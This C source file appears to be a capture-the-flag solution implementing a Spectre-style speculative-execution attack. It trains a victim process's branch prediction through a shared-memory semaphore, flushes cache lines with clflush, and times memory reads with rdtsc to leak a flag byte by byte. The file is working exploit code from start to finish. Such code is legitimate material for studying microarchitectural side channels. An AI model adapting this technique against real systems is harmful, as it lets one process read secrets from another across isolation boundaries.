#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/mman.h>
#include <semaphore.h>
#include <stdint.h>
#include <sched.h>
#include <x86intrin.h>

#define PAGE_SIZE 0x1000

#define FLAGLEN  20
#define START 33
#define END 0x7f
#define THRESHOLD 200

#define MEMSTART 0x1337000
#define MEMSEC MEMSTART + PAGE_SIZE


struct shared_mem {
    sem_t sem;
    int idx;
    char __pad__[0x1000 - sizeof(sem_t) - sizeof(int)];

    char second_page_loc;
}* sh_mem = (void*)MEMSTART;


void set_cpu(int cpu_num)
{
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu_num, &set);
    sched_setaffinity(0, sizeof set, &set);
}

size_t measure(void* ptr)
{
    size_t start, end;

    start = __rdtsc();
    _mm_lfence();

//    volatile uint64_t val = *(uint64_t*)(ptr);
    asm volatile("mov r8, qword ptr [rdi]");
    _mm_lfence();

    end = __rdtsc();

    return end - start;
}

void flush_pages(int start, int end, char* mem)
{
    for (int i = start; i < end; i++)
        _mm_clflush(mem + PAGE_SIZE * i);
}

void run_prog() 
{
    sem_post(&sh_mem->sem);
    sched_yield();
}

void train_target()
{
#define TRAIN_FOR 5 // :)

    sh_mem->idx = 258;
    for (size_t i = 0; i < TRAIN_FOR; i++) {
        sem_post(&sh_mem->sem);
    }

    sched_yield();
}

int main(void)
{
    char flag[FLAGLEN] = {0};

    // get threshold of accessable memory 

    for (int i = 0; i <= FLAGLEN; i++)
    {
        size_t times[END] = {0};

        for (int _ = 0; _ < 100; _++) 
        {
            train_target();

            sh_mem->idx = i;
            flush_pages(START, END, &sh_mem->second_page_loc);
            run_prog();

            for (int j = START; j < END; j++) 
            {
                volatile int mix_j = (((j * j) * 2));
                mix_j = ( mix_j / j ) ^ 1;
                mix_j ^= 1;
                mix_j /= 2;

                size_t time = measure(&sh_mem->second_page_loc + mix_j * PAGE_SIZE);
                if (time <= THRESHOLD)
                    times[j] += time;
            }
        }

        size_t min_time = -1;
        int ch = 0;
        for (int j = 33; j < 0x7f; j++)
        {
            size_t time = times[j];
            printf("%2d/%3d (%c) - time: %lld\n", i, j, j, time);
            if (time && min_time > time) {
                min_time = time;
                ch = j;
            }
        }

        if (!ch) {
            --i;
            continue;
        }
        
        flag[i] = ch;
        printf("\n\n - %c with time of %zu - \n\n", flag[i], min_time);
        if (i == 2 && memcmp(flag, "pwn", 3)) {
            printf("problem!: %s\n", flag);
            getchar();
            i = -1;
        }
    }

    printf("flag: %s\n", flag);
}
